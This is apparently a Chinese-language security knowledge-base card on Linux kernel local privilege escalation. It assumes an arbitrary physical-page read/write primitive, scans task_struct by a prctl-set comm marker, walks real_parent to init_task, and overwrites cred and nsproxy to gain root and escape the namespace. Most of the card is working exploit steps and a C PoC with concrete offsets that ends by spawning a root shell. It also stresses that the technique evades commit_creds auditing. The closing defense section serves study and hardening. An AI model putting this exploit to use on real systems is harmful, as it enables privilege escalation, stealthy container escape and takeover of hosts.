---
id: binary-pwn-kernel-task-struct-comm-scan-init-cred-lpe
title: 内核任意读写后按 comm 扫描 task_struct 并沿 real_parent 找 init_task，覆写 cred/nsproxy 提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: task-struct-comm-scan-init-cred-overwrite
aliases:
- task_struct 扫描
- comm 定位 task_struct
- init_cred 覆写
- cred 提权
- task_struct cred 替换
- ptraced 自指针
- page_offset_base 恢复
tags:
- linux-kernel
- task-struct
- cred
- privilege-escalation
- arbitrary-read-write
- vmemmap
- exploit-post
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:10:25+08:00'
  notes: 已对照原文与截图核对：prctl comm标记、vmemmap逐页memmem、ptraced自指针-2528、comm[-2]/[-3]/[-57]/[-56]校验、real_parent找init_task、tsk[363]/[364]/[377]覆写cred/nsproxy与最终root shell截图一致；未验证点：未执行PoC，偏移依赖内核版本。
---

## 一句话结论

在内核任意物理页读写已经成立后，用 `prctl(PR_SET_NAME, "<唯一名字>")` 给当前进程的 `task_struct.comm` 打标记，逐张扫描 vmemmap 描述的物理页找到该字符串；利用 `task_struct.ptraced` 指向自身（自指链表头）反推 `task_struct` 基址与 `page_offset_base`，再沿 `real_parent` 一路向上找到 `init_task`，读出 `init_cred`/`init_nsproxy` 并写进当前进程的 `real_cred`/`cred`/`nsproxy`，即可获得 root 与 init 命名空间。

## 原理

- **comm 是理想扫描特征**：`task_struct.comm` 是 16 字节、进程名可见、由 `prctl(PR_SET_NAME)` 直接控制。取一个不会与其它进程冲突的 12 字节名字（如 `arttnba3pwnn`），在任意物理页读写原语下逐页 `memmem()` 搜索，就能在不依赖内核符号/偏移表的情况下定位当前进程的 `task_struct`。
- **vmemmap 遍历**：`struct page` 数组按 PFN 排列，`page = vmemmap_base + PFN*0x40`；读 `vmemmap_base + i*0x40` 对应的物理页（即 PFN i 的内容），就能逐页扫描整个物理内存。4KB 页中 `comm` 附近还有 `cred/real_cred/real_parent/parent` 等指针，可作为命中校验，避免误报。
- **用 ptraced 自指针求 task 基址**：`task_struct.ptraced`（ptrace 链表）在无调试者时指向自身，即字段值等于“该字段自身的地址”。若命中 `comm` 在页内偏移为 `off`，则 `ptraced` 字段值减去 `ptraced` 在 task_struct 中的偏移（原文 2528 字节）就是 `task_struct` 基址。
- **恢复 page_offset_base**：已知 `ptraced` 的虚拟地址（自指）、它所在页的 PFN（扫描下标 i）和 `vmemmap` 基址，则 `page_offset_base = (ptraced & PAGE_MASK) - i*0x1000`，再按 KASLR 粒度（256MB）对齐。这样把 direct map 的 VA↔PA 换算补齐，后续 `direct_map_addr_to_page_addr()` 才能把任意内核 VA 转成 `struct page *`。
- **向上找 init_task**：`task_struct.real_parent` 构成进程树；`init_task` 的 `real_parent` 指向自己（或形成自环）。反复读 `real_parent` 并判断“父等于自身”，即可停在 init 进程的 `task_struct`。
- **init_cred 与 init_nsproxy**：`init_task` 的 `real_cred`/`cred` 字段指向全局 `init_cred`（root 凭据），`nsproxy` 指向 `init_nsproxy`。把当前进程的 `real_cred`、`cred` 都改成 `init_cred`，并把 `nsproxy` 改成 `init_nsproxy`，即完成提权并脱离当前（可能受限的）命名空间。
- **为什么直接改 cred 可行**：`cred` 是内核堆对象指针，进程权限检查读的是 `current->cred` 的字段；只要指针指向合法且 refcount 足够的 `init_cred`，后续 `setuid/getuid` 等检查都会以 root 身份通过。直接把 `cred` 指针替换为 `init_cred` 不需要伪造整个结构体，也不触发 `commit_creds` 的订阅/审计路径（因此更隐蔽）。

## 触发条件

- 已有任意物理页读写（或等价的内核任意读写）；能把内核虚拟地址转换为 `struct page *`（需要 `vmemmap_base`、`page_offset_base`）。
- 目标内核的 `task_struct` 字段偏移已知或可按版本核对：`comm`、`cred`、`real_cred`、`real_parent`、`parent`、`ptraced`、`nsproxy`；原文字段为 `comm[-2]≈cred`、`comm[-3]≈real_cred`、`comm[-57]=real_parent`、`comm[-56]=parent`、`comm[-50]=ptraced`、`tsk_buf[363]=real_cred`、`tsk_buf[364]=cred`、`tsk_buf[377]=nsproxy`（按 8 字节索引）。
- 进程有权限调用 `prctl(PR_SET_NAME)`；名字长度不超过 15 字节且唯一。
- 目标未启用会阻止 cred 指针替换的强完整性机制（如 `CONFIG_DEBUG_CREDENTIALS` 的严格校验、某些 LSM 对 cred 的额外约束）；KASLR 已通过 vmemmap 扫描恢复。
- 物理内存规模可接受逐页扫描（原文环境较小，扫描很快；大内存需优化扫描步长/范围）。

## 利用步骤

1. **建立任意读写**：先用页级 UAF + 自写管道（或其它原语）拿到“按 `struct page *` 读写物理页”的能力，并泄露 `vmemmap_base` 与 kernel base。
2. **打 comm 标记**：调用 `prctl(PR_SET_NAME, "arttnba3pwnn")`；确保该名字不会与现有进程重名。
3. **逐页扫描 vmemmap**：对 `i = 0..` 读取 `vmemmap_base + i*0x40` 描述的 4KB 页，用 `memmem(buf, 0xf00, name, len)` 搜索；命中后校验 `comm[-2]`（cred）、`comm[-3]`（real_cred）、`comm[-57]`（real_parent）、`comm[-56]`（parent）都落在 direct map 区（`> 0xffff888000000000`）。
4. **求当前 task 与 page_offset_base**：`parent_task = comm[-57]`；`current_task = comm[-50] - 2528`（ptraced 自指针减字段偏移）；`page_offset_base = ((comm[-50] & PAGE_MASK) - i*0x1000) & ~(0x10000000-1)`。
5. **沿 real_parent 找 init_task**：循环读取 `parent_task` 所在页（必要时两页），取 `task_struct.real_parent`；若 `parent_task == real_parent` 说明到达 `init_task`，跳出；否则 `parent_task = real_parent`。
6. **读出 init_cred/init_nsproxy**：在 init_task 命中页中取 `tsk_buf[363]`（real_cred）、`tsk_buf[364]`（cred）、`tsk_buf[377]`（nsproxy）；`init_cred = tsk_buf[363]`，`init_nsproxy = tsk_buf[377]`。
7. **覆写当前 task**：把当前 task 所在页读入缓冲区，定位 `current_task & 0xfff` 的页内偏移，写 `tsk_buf[363]=init_cred`、`tsk_buf[364]=init_cred`、`tsk_buf[377]=init_nsproxy`；跨页时分别写两页。
8. **验证并拿 shell**：`setresuid(0,0,0)`、`setresgid(0,0,0)`，检查 `getuid()==0` 后执行 `system("su root -c sh")` 或直接读 `/flag`。

## PoC

```c
#define KERNEL_DIRECT_PHYSMEM_MAP_BASE 0xffff888000000000ULL
#define KASLR_GRANULARITY              0x10000000ULL
#define KASLR_MASK                     (~(KASLR_GRANULARITY - 1))

size_t direct_map_addr_to_page_addr(size_t direct_map_addr) {
    size_t page_count = ((direct_map_addr & ~0xfffULL) - page_offset_base) / 0x1000;
    return vmemmap_base + page_count * 0x40;      /* sizeof(struct page) = 0x40 */
}

/* 1) comm 扫描 */
prctl(PR_SET_NAME, "arttnba3pwnn");
for (int i = 0; ; i++) {
    arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * 0x40), buf);
    size_t *comm_addr = memmem(buf, 0xf00, "arttnba3pwnn", 12);
    if (comm_addr
        && comm_addr[-2] > KERNEL_DIRECT_PHYSMEM_MAP_BASE   /* cred */
        && comm_addr[-3] > KERNEL_DIRECT_PHYSMEM_MAP_BASE   /* real_cred */
        && comm_addr[-57] > KERNEL_DIRECT_PHYSMEM_MAP_BASE  /* real_parent */
        && comm_addr[-56] > KERNEL_DIRECT_PHYSMEM_MAP_BASE) /* parent */
    {
        parent_task   = comm_addr[-57];
        current_task  = comm_addr[-50] - 2528;              /* ptraced 自指针 */
        page_offset_base = (comm_addr[-50] & ~0xfffULL) - i * 0x1000;
        page_offset_base &= KASLR_MASK;
        break;
    }
}

/* 2) 沿 real_parent 找 init_task */
for (;;) {
    size_t page = direct_map_addr_to_page_addr(parent_task);
    arbitrary_read_by_pipe((struct page *)page, buf);
    arbitrary_read_by_pipe((struct page *)(page + 0x40), &buf[512]);
    size_t *tsk = (size_t *)((size_t)buf + (parent_task & 0xfff));
    if (parent_task == tsk[309])          /* real_parent 指向自身 */
        break;
    parent_task = tsk[309];
}

/* 3) 取 init_cred/init_nsproxy，覆写当前 task */
init_cred    = tsk[363];
init_nsproxy = tsk[377];

size_t cur_page = direct_map_addr_to_page_addr(current_task);
arbitrary_read_by_pipe((struct page *)cur_page, buf);
arbitrary_read_by_pipe((struct page *)(cur_page + 0x40), &buf[512]);
size_t *cur = (size_t *)((size_t)buf + (current_task & 0xfff));
cur[363] = init_cred;      /* real_cred */
cur[364] = init_cred;      /* cred */
cur[377] = init_nsproxy;   /* nsproxy */

arbitrary_write_by_pipe((struct page *)cur_page, buf, 0xff0);
arbitrary_write_by_pipe((struct page *)(cur_page + 0x40), &buf[512], 0xff0);

/* 4) 验证 */
setresuid(0, 0, 0);
setresgid(0, 0, 0);
if (!getuid()) system("su root -c sh");
```

上述偏移（`2528`、`309`、`363/364`、`377`、`comm[-50]` 等）来自原文目标内核的 `task_struct` 布局，必须按实际内核版本/编译配置重新核对；本卡不执行 PoC。

## 变体与关联

- **未知偏移**：若无法确定 `cred/nsproxy` 偏移，可改为覆盖 `modprobe_path`、`core_pattern`，或用 ROP 调 `commit_creds(prepare_kernel_cred(0))`；但 cred 替换通常更短、更稳。
- **容器逃逸**：同时覆写 `nsproxy = init_nsproxy` 可脱离当前 mount/pid/net 等命名空间；若只需 root 可只改 `cred/real_cred`。
- **扫描优化**：大内存下可先按 `task_struct` 常见大小/对齐跳页，或利用 `init_task` 在 `.data` 的固定偏移；也可从 `current` 的 kernel stack 泄露反查。
- **校验增强**：除 cred/real_cred/parent 外，还可校验 `comm` 前后字段、`pid/tgid`、`tasks` 链表，降低误命中。
- **关联**：[[binary-pwn-kernel-self-writing-pipe-arbitrary-rw]]（前置任意读写与 KASLR 恢复）、[[binary-pwn-kernel-page-level-uaf-pipe-buffer-off-by-null]]（页级 UAF 入口）、[[binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw]]（另一种任意物理内存读写）、[[binary-pwn-kernel-cve-2025-21702-pfifo-qlen-mismatch-uaf-lpe]]（另一条 task/cred 提权路线）。
- **边界**：需要先有任意读写和 KASLR 恢复；偏移强依赖内核版本；`CONFIG_DEBUG_CREDENTIALS`、LSM 的 cred 校验或 `CONFIG_RANDOMIZE_MEMORY` 会增加难度，但通常不能完全阻止指针替换。

## 检测与防御

- **凭据完整性**：开启 `CONFIG_DEBUG_CREDENTIALS`、LSM 的 cred 校验与审计；监控进程 `cred` 指针突然变为 `init_cred` 或跨命名空间跳变。
- **减少任意读写面**：修复页级 UAF/越界；限制 unprivileged user namespace 与自定义字符设备；降低 pipe 资源上限。
- **KASLR 强化**：开启 `CONFIG_RANDOMIZE_MEMORY`、更大物理随机化范围，增加 vmemmap/direct map 扫描成本；`kptr_restrict`/`dmesg_restrict` 只能阻止符号泄露，不能阻止物理页扫描。
- **检测**：进程名异常（`prctl` 设置的长随机名）、短时间内大量读取物理页、`task_struct` 被改写导致的审计/崩溃；`CONFIG_DEBUG_CREDENTIALS` 可在 cred 引用计数/魔术值被破坏时报警。
- **响应**：发现自定义内核模块存在 0x800 对象末尾写等漏洞时，优先下线设备节点并修补；容器内限制 `CAP_SYS_ADMIN` 与 `/dev` 访问，降低入口可达性。
